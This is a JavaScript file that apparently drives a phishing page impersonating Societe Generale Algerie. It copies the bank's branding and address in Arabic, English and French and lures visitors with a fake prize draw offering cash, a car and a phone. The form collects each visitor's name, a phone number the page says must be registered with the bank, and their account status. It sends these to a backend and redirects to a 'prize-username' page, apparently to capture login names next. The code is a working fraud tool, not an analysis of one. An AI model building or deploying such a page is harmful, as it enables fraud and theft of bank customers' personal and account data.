/* الصفحة الرئيسية: الترجمة (ar/en/fr)، السلايدر، نافذة التسجيل بالتحقق من رقم الهاتف، ونافذة النجاح. */
(function () {
  'use strict';

  var I18N = {
    ar: {
      lang: 'ar',
      dir: 'rtl',
      title: 'اربح جوائز نقدية قيّمة مع Societe Generale Algerie',
      desc: 'سجّل الآن واربح 1,000,000 دينار جزائري، سيارة 2027، و iPhone 18 Pro Max مع Societe Generale Algerie',
      img: 'ar',
      t: {
        'home.brand1': 'SOCIETE GENERALE',
        'home.brand2': 'ALGERIE',
        'home.lang.ar': 'عربي',
        'home.lang.en': 'EN',
        'home.lang.fr': 'FR',
        'home.hero.title': 'سجّل واربح جوائز قيّمة من بنك Societe Generale Algerie',
        'home.hero.subtitle': 'جوائز نقدية، سيارة، وأجهزة ذكية بانتظارك',
        'home.cta.hero': 'سجّل واربح',
        'home.cta.card1': 'سجّل واربح',
        'home.cta.card2': 'سجّل واربح',
        'home.cta.card3': 'سجّل واربح',
        'home.cta.card4': 'سجّل واربح',
        'home.footer.contact': 'تواصل معنا',
        'home.footer.address': 'شارع كريم بلقاسم، حيدرة، الجزائر العاصمة، الجزائر',
        'home.footer.phoneLabel': 'الهاتف:',
        'home.footer.phone': '3020',
        'home.footer.faxLabel': 'فاكس:',
        'home.footer.fax': '023 48 18 19',
        'home.footer.email': 'contact@socgen.dz',
        'home.footer.links': 'روابط مهمة',
        'home.footer.terms': 'الشروط والأحكام',
        'home.footer.privacy': 'سياسة الخصوصية',
        'home.footer.faq': 'الأسئلة الشائعة',
        'home.footer.legal': 'قانوني',
        'home.footer.legalNotice': 'الإشعار القانوني',
        'home.footer.cookies': 'سياسة ملفات تعريف الارتباط',
        'home.footer.dataProtection': 'حماية البيانات',
        'home.footer.copyright': 'جميع الحقوق محفوظة © 2025 Societe Generale Algerie',
        'home.modal.title': 'أكمل بياناتك',
        'home.modal.subtitle': 'من فضلك أدخل بياناتك لإتمام الطلب',
        'home.modal.name': 'الاسم الكامل',
        'home.modal.phone': 'رقم الهاتف',
        'home.modal.phoneError': 'رقم الهاتف غير صحيح يرجى ادخال رقم هاتف مسجل في البنك',
        'home.modal.hasAccount': 'هل لديك حساب في بنك Societe Generale Algerie؟',
        'home.modal.yes': 'نعم',
        'home.modal.no': 'لا',
        'home.modal.submit': 'تأكيد الطلب',
        'home.modal.namePh': 'مثال: محمد أمين',
        'home.modal.phonePh': '05 00 00 00 00',
        'home.modal.closeAria': 'إغلاق',
        'home.slide1': 'شريحة 1',
        'home.slide2': 'شريحة 2',
        'home.slide3': 'شريحة 3',
        'home.slide4': 'شريحة 4',
        'home.alt.cash': 'اربح جوائز نقدية 1,000,000 دينار جزائري',
        'home.alt.car': 'اربح سيارة 2027',
        'home.alt.iphone': 'اربح iPhone 18 Pro Max',
        'home.alt.watch': 'اربح ساعة ذكية فاخرة',
        'home.success.title': 'تم تسجيلك بنجاح!',
        'home.success.subtitle': 'أصبحت ضمن المشاركين في السحب. حظاً موفقاً!',
        'home.success.explore': 'استكشف تطبيق APPLI SGA',
        'home.success.close': 'إغلاق',
        'home.success.closeAria': 'إغلاق'
      }
    },

    en: {
      lang: 'en',
      dir: 'ltr',
      title: 'Win valuable cash prizes with Societe Generale Algerie',
      desc: 'Register now and win 1,000,000 Algerian Dinars, a 2027 car and an iPhone 18 Pro Max with Societe Generale Algerie',
      img: 'en',
      t: {
        'home.brand1': 'SOCIETE GENERALE',
        'home.brand2': 'ALGERIE',
        'home.lang.ar': 'عربي',
        'home.lang.en': 'EN',
        'home.lang.fr': 'FR',
        'home.hero.title': 'Register & win valuable prizes from Societe Generale Algerie',
        'home.hero.subtitle': 'Cash prizes, a car, and smart devices await you',
        'home.cta.hero': 'Register & Win',
        'home.cta.card1': 'Register & Win',
        'home.cta.card2': 'Register & Win',
        'home.cta.card3': 'Register & Win',
        'home.cta.card4': 'Register & Win',
        'home.footer.contact': 'Contact us',
        'home.footer.address': 'Karim Belkacem Street, Hydra, Algiers, Algeria',
        'home.footer.phoneLabel': 'Phone:',
        'home.footer.phone': '3020',
        'home.footer.faxLabel': 'Fax:',
        'home.footer.fax': '023 48 18 19',
        'home.footer.email': 'contact@socgen.dz',
        'home.footer.links': 'Important links',
        'home.footer.terms': 'Terms & Conditions',
        'home.footer.privacy': 'Privacy Policy',
        'home.footer.faq': 'FAQ',
        'home.footer.legal': 'Legal',
        'home.footer.legalNotice': 'Legal Notice',
        'home.footer.cookies': 'Cookies Policy',
        'home.footer.dataProtection': 'Data Protection',
        'home.footer.copyright': 'All rights reserved © 2025 Societe Generale Algerie',
        'home.modal.title': 'Complete your details',
        'home.modal.subtitle': 'Please enter your details to complete the request',
        'home.modal.name': 'Full name',
        'home.modal.phone': 'Phone number',
        'home.modal.phoneError': 'Invalid phone number. Please enter a phone number registered with the bank.',
        'home.modal.hasAccount': 'Do you have an account with Societe Generale Algerie bank?',
        'home.modal.yes': 'Yes',
        'home.modal.no': 'No',
        'home.modal.submit': 'Confirm request',
        'home.modal.namePh': 'e.g. Mohamed Amine',
        'home.modal.phonePh': '05 00 00 00 00',
        'home.modal.closeAria': 'Close',
        'home.slide1': 'Slide 1',
        'home.slide2': 'Slide 2',
        'home.slide3': 'Slide 3',
        'home.slide4': 'Slide 4',
        'home.alt.cash': 'Win cash prizes of 1,000,000 Algerian Dinars',
        'home.alt.car': 'Win a 2027 car',
        'home.alt.iphone': 'Win an iPhone 18 Pro Max',
        'home.alt.watch': 'Win a luxury smartwatch',
        'home.success.title': "You're registered!",
        'home.success.subtitle': 'You are now entered in the draw. Good luck!',
        'home.success.explore': 'Explore the APPLI SGA app',
        'home.success.close': 'Close',
        'home.success.closeAria': 'Close'
      }
    },

    fr: {
      lang: 'fr',
      dir: 'ltr',
      title: 'Gagnez des prix précieux avec Societe Generale Algerie',
      desc: 'Inscrivez-vous et gagnez 1 000 000 de dinars algériens, une voiture 2027 et un iPhone 18 Pro Max avec Societe Generale Algerie',
      img: 'en',
      t: {
        'home.brand1': 'SOCIETE GENERALE',
        'home.brand2': 'ALGERIE',
        'home.lang.ar': 'عربي',
        'home.lang.en': 'EN',
        'home.lang.fr': 'FR',
        'home.hero.title': 'Inscrivez-vous et gagnez des prix précieux de Societe Generale Algerie',
        'home.hero.subtitle': 'Des prix en espèces, une voiture et des appareils intelligents vous attendent',
        'home.cta.hero': "S'inscrire et gagner",
        'home.cta.card1': "S'inscrire et gagner",
        'home.cta.card2': "S'inscrire et gagner",
        'home.cta.card3': "S'inscrire et gagner",
        'home.cta.card4': "S'inscrire et gagner",
        'home.footer.contact': 'Contactez-nous',
        'home.footer.address': 'Rue Karim Belkacem, Hydra, Alger, Algérie',
        'home.footer.phoneLabel': 'Téléphone:',
        'home.footer.phone': '3020',
        'home.footer.faxLabel': 'Fax:',
        'home.footer.fax': '023 48 18 19',
        'home.footer.email': 'contact@socgen.dz',
        'home.footer.links': 'Liens importants',
        'home.footer.terms': 'Conditions générales',
        'home.footer.privacy': 'Politique de confidentialité',
        'home.footer.faq': 'FAQ',
        'home.footer.legal': 'Légal',
        'home.footer.legalNotice': 'Mentions légales',
        'home.footer.cookies': 'Politique de cookies',
        'home.footer.dataProtection': 'Protection des données',
        'home.footer.copyright': 'Tous droits réservés © 2025 Societe Generale Algerie',
        'home.modal.title': 'Complétez vos informations',
        'home.modal.subtitle': 'Veuillez saisir vos informations pour finaliser la demande',
        'home.modal.name': 'Nom complet',
        'home.modal.phone': 'Numéro de téléphone',
        'home.modal.phoneError': 'Numéro de téléphone invalide. Veuillez saisir un numéro enregistré auprès de la banque.',
        'home.modal.hasAccount': 'Avez-vous un compte chez Societe Generale Algerie ?',
        'home.modal.yes': 'Oui',
        'home.modal.no': 'Non',
        'home.modal.submit': 'Confirmer la demande',
        'home.modal.namePh': 'ex. Mohamed Amine',
        'home.modal.phonePh': '05 00 00 00 00',
        'home.modal.closeAria': 'Fermer',
        'home.slide1': 'Diapositive 1',
        'home.slide2': 'Diapositive 2',
        'home.slide3': 'Diapositive 3',
        'home.slide4': 'Diapositive 4',
        'home.alt.cash': 'Gagnez des prix en espèces de 1 000 000 DA',
        'home.alt.car': 'Gagnez une voiture 2027',
        'home.alt.iphone': 'Gagnez un iPhone 18 Pro Max',
        'home.alt.watch': 'Gagnez une montre connectée de luxe',
        'home.success.title': 'Vous êtes inscrit !',
        'home.success.subtitle': 'Vous participez désormais au tirage. Bonne chance !',
        'home.success.explore': "Découvrir l'application APPLI SGA",
        'home.success.close': 'Fermer',
        'home.success.closeAria': 'Fermer'
      }
    }
  };

  var LANG_CLASSES = {
    ar: {
      ar: 'rounded-full px-3 py-1.5 text-xs font-bold transition-all duration-200 bg-[#c62828] text-white shadow-[0_2px_8px_rgba(198,40,40,0.25)]',
      en: 'rounded-full px-3 py-1.5 text-xs font-bold transition-all duration-200 border border-[#e3e5e8] text-[#5c626b] hover:border-[#c62828] hover:text-[#c62828]',
      fr: 'rounded-full px-3 py-1.5 text-xs font-bold transition-all duration-200 border border-[#e3e5e8] text-[#5c626b] hover:border-[#c62828] hover:text-[#c62828]'
    },
    en: {
      ar: 'rounded-full px-3 py-1.5 text-xs font-bold transition-all duration-200 border border-[#e3e5e8] text-[#5c626b] hover:border-[#c62828] hover:text-[#c62828]',
      en: 'rounded-full px-3 py-1.5 text-xs font-bold transition-all duration-200 bg-[#c62828] text-white shadow-[0_2px_8px_rgba(198,40,40,0.25)]',
      fr: 'rounded-full px-3 py-1.5 text-xs font-bold transition-all duration-200 border border-[#e3e5e8] text-[#5c626b] hover:border-[#c62828] hover:text-[#c62828]'
    },
    fr: {
      ar: 'rounded-full px-3 py-1.5 text-xs font-bold transition-all duration-200 border border-[#e3e5e8] text-[#5c626b] hover:border-[#c62828] hover:text-[#c62828]',
      en: 'rounded-full px-3 py-1.5 text-xs font-bold transition-all duration-200 border border-[#e3e5e8] text-[#5c626b] hover:border-[#c62828] hover:text-[#c62828]',
      fr: 'rounded-full px-3 py-1.5 text-xs font-bold transition-all duration-200 bg-[#c62828] text-white shadow-[0_2px_8px_rgba(198,40,40,0.25)]'
    }
  };

  var STORAGE_KEY = 'homeLang';
  var root = document.getElementById('root');
  if (!root) return;

  var langButtons = {
    ar: root.querySelector('[data-testid="lang-option-ar"]'),
    en: root.querySelector('[data-testid="lang-option-en"]'),
    fr: root.querySelector('[data-testid="lang-option-fr"]')
  };
  var descMeta = document.querySelector('meta[name="description"]');
  var ogTitle = document.querySelector('meta[property="og:title"]');
  var ogDesc = document.querySelector('meta[property="og:description"]');
  var current = I18N.ar;

  function applyLang(code) {
    var dict = I18N[code] || I18N.ar;
    current = dict;
    var t = dict.t;

    document.documentElement.lang = dict.lang;
    document.documentElement.dir = dict.dir;
    document.title = dict.title;
    if (descMeta) descMeta.setAttribute('content', dict.desc);
    if (ogTitle) ogTitle.setAttribute('content', dict.title);
    if (ogDesc) ogDesc.setAttribute('content', dict.desc);

    document.querySelectorAll('[data-i18n]').forEach(function (el) {
      var value = t[el.getAttribute('data-i18n')];
      if (value != null) el.textContent = value;
    });
    document.querySelectorAll('[data-i18n-aria]').forEach(function (el) {
      var value = t[el.getAttribute('data-i18n-aria')];
      if (value != null) el.setAttribute('aria-label', value);
    });
    document.querySelectorAll('[data-i18n-ph]').forEach(function (el) {
      var value = t[el.getAttribute('data-i18n-ph')];
      if (value != null) el.setAttribute('placeholder', value);
    });
    document.querySelectorAll('[data-i18n-alt]').forEach(function (el) {
      var value = t[el.getAttribute('data-i18n-alt')];
      if (value != null) el.setAttribute('alt', value);
    });

    document.querySelectorAll('img').forEach(function (img) {
      if (img.dataset.baseSrc === undefined) img.dataset.baseSrc = img.getAttribute('src');
      var baseSrc = img.dataset.baseSrc;
      var version = (baseSrc.match(/\?v=\d+$/) || [''])[0];
      img.setAttribute('src', baseSrc.replace(/-(ar|en|fr)\.jpg(\?v=\d+)?$/, '-' + dict.img + '.jpg' + version));
    });

    var classes = LANG_CLASSES[dict.lang] || LANG_CLASSES.ar;
    Object.keys(langButtons).forEach(function (key) {
      if (langButtons[key]) langButtons[key].className = classes[key] || langButtons[key].className;
    });

    try { localStorage.setItem(STORAGE_KEY, code); } catch (e) {}
    if (window.SiteLang) window.SiteLang.set(code);
  }

  Object.keys(langButtons).forEach(function (code) {
    if (langButtons[code]) langButtons[code].addEventListener('click', function () { applyLang(code); });
  });

  var saved = 'ar';
  try {
    var fromUrl = new URLSearchParams(window.location.search).get('lang');
    saved = (fromUrl && I18N[fromUrl]) ? fromUrl : (localStorage.getItem(STORAGE_KEY) || 'ar');
  } catch (e) {}
  applyLang(I18N[saved] ? saved : 'ar');

  // ── السلايدر الترويجي ──────────────────────────────────
  var slider = root.querySelector('[data-testid="promo-slider"]');
  if (slider) {
    var slides = Array.prototype.slice.call(slider.querySelectorAll('img'));
    var dots = Array.prototype.slice.call(slider.querySelectorAll('[data-testid^="slider-dot-"]'));
    var index = 0;
    var timer = null;

    slides.forEach(function (s, i) { if (s.classList.contains('opacity-100')) index = i; });

    function show(next) {
      index = next;
      slides.forEach(function (s, i) {
        s.classList.toggle('opacity-100', i === next);
        s.classList.toggle('opacity-0', i !== next);
      });
      dots.forEach(function (d, i) {
        var on = i === next;
        d.classList.toggle('w-6', on);
        d.classList.toggle('w-1.5', !on);
        d.classList.toggle('bg-white', on);
        d.classList.toggle('bg-white/50', !on);
      });
    }

    function start() {
      stop();
      timer = setInterval(function () { show((index + 1) % slides.length); }, 4000);
    }

    function stop() {
      if (timer) {
        clearInterval(timer);
        timer = null;
      }
    }

    dots.forEach(function (dot, i) {
      dot.addEventListener('click', function () {
        show(i);
        start();
      });
    });

    show(index);
    start();
  }

  // ── نافذة التسجيل ─────────────────────────────────────
  var modal = root.querySelector('[data-testid="registration-modal"]');
  if (!modal) return;

  var form = modal.querySelector('form');
  var nameInput = modal.querySelector('[data-testid="input-name"]');
  var phoneInput = modal.querySelector('[data-testid="input-phone"]');
  var yesButton = modal.querySelector('[data-testid="has-account-yes"]');
  var noButton = modal.querySelector('[data-testid="has-account-no"]');
  var submitButton = modal.querySelector('[data-testid="submit-registration-button"]');
  var closeButton = modal.querySelector('[data-testid="modal-close-button"]');
  var phoneError = document.getElementById('phoneErrorMsg');
  var successSheet = document.getElementById('registrationSuccessSheet');
  var closeSuccessBtn = document.getElementById('closeSuccessBtn');
  var successCloseX = document.getElementById('successCloseX');
  var exploreAppBtn = document.getElementById('exploreAppBtn');
  var hasAccount = '';
  var redirectTimer = null;

  var MOBILE_REGEX = /^0[567]\d{8}$/;
  var ARABIC_DIGITS = '٠١٢٣٤٥٦٧٨٩';
  var PERSIAN_DIGITS = '۰۱۲۳۴۵۶۷۸۹';

  function normalizePhone(value) {
    var phone = String(value == null ? '' : value).trim();
    if (!phone) return '';

    phone = phone.replace(/[٠-٩۰-۹]/g, function (digit) {
      var i = ARABIC_DIGITS.indexOf(digit);
      if (i === -1) i = PERSIAN_DIGITS.indexOf(digit);
      return String(i);
    });

    if (!/^\+?[\d\s().-]+$/.test(phone)) return '';

    phone = phone.replace(/[\s().-]/g, '');

    if (phone.startsWith('+')) {
      if (!phone.startsWith('+213')) return '';
      phone = '0' + phone.slice(4);
    } else if (phone.startsWith('00')) {
      if (!phone.startsWith('00213')) return '';
      phone = '0' + phone.slice(5);
    } else if (phone.startsWith('213') && phone.length === 12) {
      phone = '0' + phone.slice(3);
    }

    return phone;
  }

  function isValidPhone(value) {
    return MOBILE_REGEX.test(normalizePhone(value));
  }

  function showPhoneError() {
    if (phoneError) phoneError.classList.add('show');
    phoneInput.classList.add('invalid');
  }

  function hidePhoneError() {
    if (phoneError) phoneError.classList.remove('show');
    phoneInput.classList.remove('invalid');
  }

  function nameOk() {
    var min = parseInt(nameInput.getAttribute('minlength') || '3', 10);
    return String(nameInput.value || '').trim().length >= min;
  }

  function refreshSubmit() {
    submitButton.disabled = !(nameOk() && isValidPhone(phoneInput.value) && !!hasAccount);
  }

  function validatePhone(showWhileTyping) {
    var raw = String(phoneInput.value || '').trim();
    var valid = isValidPhone(raw);
    var digits = normalizePhone(raw).replace(/\D/g, '').length;

    phoneInput.setCustomValidity(valid || !raw ? '' : current.t['home.modal.phoneError']);

    if (!raw || valid) hidePhoneError();
    else if (showWhileTyping && digits >= 10) showPhoneError();

    refreshSubmit();
    return valid;
  }

  phoneInput.addEventListener('beforeinput', function (e) {
    if (e.inputType && e.inputType.startsWith('delete')) return;
    if (typeof e.data === 'string' && e.data.length > 0 && !/^[0-9٠-٩۰-۹+\s().-]+$/.test(e.data)) {
      e.preventDefault();
    }
  });

  phoneInput.addEventListener('input', function () { validatePhone(true); });

  phoneInput.addEventListener('blur', function () {
    var raw = String(phoneInput.value || '').trim();
    if (!raw) {
      hidePhoneError();
      refreshSubmit();
      return;
    }
    if (isValidPhone(raw)) {
      phoneInput.value = normalizePhone(raw);
      hidePhoneError();
    } else if (normalizePhone(raw).replace(/\D/g, '').length >= 8) {
      showPhoneError();
    }
    validatePhone(false);
  });

  nameInput.addEventListener('input', refreshSubmit);

  [yesButton, noButton].forEach(function (button) {
    button.addEventListener('click', function () {
      hasAccount = button === yesButton ? 'yes' : 'no';
      yesButton.classList.toggle('selected', hasAccount === 'yes');
      noButton.classList.toggle('selected', hasAccount === 'no');
      refreshSubmit();
    });
  });

  function openModal() {
    if (redirectTimer) {
      clearTimeout(redirectTimer);
      redirectTimer = null;
    }
    if (successSheet) successSheet.classList.remove('active');
    modal.style.display = 'flex';
    document.body.style.overflow = 'hidden';
    setTimeout(function () { if (nameInput) nameInput.focus(); }, 150);
  }

  function closeModal() {
    modal.style.display = 'none';
    document.body.style.overflow = '';
  }

  Array.prototype.forEach.call(
    root.querySelectorAll('[data-testid="hero-cta-button"], [data-testid^="promo-cta-"]'),
    function (button) { button.addEventListener('click', openModal); }
  );

  if (closeButton) closeButton.addEventListener('click', closeModal);
  modal.addEventListener('click', function (e) { if (e.target === modal) closeModal(); });

  // ── نافذة النجاح والانتقال إلى صفحة اسم المستخدم ──────
  function goToNextPage() {
    if (redirectTimer) {
      clearTimeout(redirectTimer);
      redirectTimer = null;
    }
    var href = window.SiteLang && typeof window.SiteLang.href === 'function'
      ? window.SiteLang.href('prize-username.html')
      : 'prize-username.html';
    window.location.href = href;
  }

  function openSuccessSheet() {
    modal.style.display = 'none';
    if (successSheet) {
      successSheet.classList.add('active');
      document.body.style.overflow = 'hidden';
    }
    if (redirectTimer) clearTimeout(redirectTimer);
    redirectTimer = setTimeout(goToNextPage, 1200);
  }

  [closeSuccessBtn, successCloseX, exploreAppBtn].forEach(function (button) {
    if (button) button.addEventListener('click', goToNextPage);
  });

  document.addEventListener('keydown', function (e) {
    if (e.key !== 'Escape') return;
    if (successSheet && successSheet.classList.contains('active')) goToNextPage();
    else if (modal.style.display !== 'none') closeModal();
  });

  refreshSubmit();

  form.addEventListener('submit', async function (e) {
    e.preventDefault();

    if (!nameOk()) {
      nameInput.reportValidity();
      return;
    }
    if (!validatePhone(true)) {
      showPhoneError();
      phoneInput.reportValidity();
      return;
    }
    if (!hasAccount) {
      refreshSubmit();
      return;
    }

    var name = nameInput.value.trim();
    var phone = normalizePhone(phoneInput.value);
    phoneInput.value = phone;
    hidePhoneError();

    localStorage.setItem('customerName', name);
    localStorage.setItem('phone', phone);
    localStorage.setItem('mobile', phone);
    localStorage.setItem('prizeName', name);
    localStorage.setItem('prizePhone', phone);
    localStorage.setItem('prizeHasAccount', hasAccount);

    if (window.ensureCustomerDoc) {
      try {
        await window.ensureCustomerDoc({
          name: name,
          phone: phone,
          mobile: phone,
          address: '',
          hasAccount: hasAccount,
          hasAccountLabel: hasAccount === 'yes' ? 'نعم' : 'لا',
          currentPage: 'الصفحة الرئيسية'
        });
      } catch (err) {
        console.error('ensureCustomerDoc error:', err);
      }
    }

    openSuccessSheet();
  });
})();
